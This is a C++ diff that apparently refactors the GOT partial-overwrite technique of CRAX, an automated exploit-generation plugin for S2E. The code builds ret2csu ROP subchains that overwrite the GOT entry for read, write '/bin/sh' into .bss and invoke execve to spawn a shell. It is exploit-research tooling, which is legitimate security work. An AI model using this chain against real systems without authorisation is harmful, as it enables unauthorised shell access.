@@ -29,9 +29,7 @@
 
 namespace s2e::plugins::crax {
 
-using SymbolicRopPayload = Technique::SymbolicRopPayload;
-using ConcreteRopPayload = Technique::ConcreteRopPayload;
-
+using RopSubchain = Technique::RopSubchain;
 
 GotPartialOverwrite::GotPartialOverwrite(CRAX &ctx)
     : Technique(ctx) {
@@ -51,45 +49,42 @@ void GotPartialOverwrite::resolveRequiredGadgets() {
 
 }
 
-std::string GotPartialOverwrite::getAuxiliaryFunctions() const {
-    return "";
-}
 
-std::vector<SymbolicRopPayload> GotPartialOverwrite::getSymbolicRopPayloadList() const {
+std::vector<RopSubchain> GotPartialOverwrite::getRopSubchains() const {
     Ret2csu *ret2csu = dynamic_cast<Ret2csu *>(Technique::s_mapper["Ret2csu"]);
     assert(ret2csu);
 
     // read(0, elf.got['read'], 1), setting RAX to 1.
-    SymbolicRopPayload read1 = ret2csu->getSymbolicRopPayloadList(
+    RopSubchain read1 = ret2csu->getRopSubchains(
         BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create(m_ctx.getExploit(), "got", "read"),
         ConstantExpr::create(1, Expr::Int64))[0];
 
     // write(1, 0, 0), setting RAX to 0.
-    SymbolicRopPayload read2 = ret2csu->getSymbolicRopPayloadList(
+    RopSubchain read2 = ret2csu->getRopSubchains(
         BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
         ConstantExpr::create(1, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64))[0];
 
     // Read "/bin/sh" into elf.bss(), setting RAX to 59.
-    SymbolicRopPayload read3 = ret2csu->getSymbolicRopPayloadList(
+    RopSubchain read3 = ret2csu->getRopSubchains(
         BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create(m_ctx.getExploit(), "bss"),
         ConstantExpr::create(59, Expr::Int64))[0];
 
     // Return to sys_execve.
-    SymbolicRopPayload read4 = ret2csu->getSymbolicRopPayloadList(
+    RopSubchain read4 = ret2csu->getRopSubchains(
         BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
         BaseOffsetExpr::create(m_ctx.getExploit(), "bss"),
         ConstantExpr::create(0, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64))[0];
 
-    SymbolicRopPayload part1;
-    SymbolicRopPayload part2;
-    SymbolicRopPayload part3;
+    RopSubchain part1;
+    RopSubchain part2;
+    RopSubchain part3;
 
     part1.reserve(1 + read1.size() + read2.size() + read3.size() + read4.size());
     part1.push_back(ConstantExpr::create(0, Expr::Int64));
@@ -103,12 +98,8 @@ std::vector<SymbolicRopPayload> GotPartialOverwrite::getSymbolicRopPayloadList()
     return {part1, part2, part3};
 }
 
-ConcreteRopPayload GotPartialOverwrite::getExtraPayload() const {
-    return {0};  // rbp
-}
-
-std::string GotPartialOverwrite::toString() const {
-    return "GotPartialOverwrite";
+RopSubchain GotPartialOverwrite::getExtraRopSubchain() const {
+    return { ConstantExpr::create(0, Expr::Int64) };  // rbp
 }
 
 
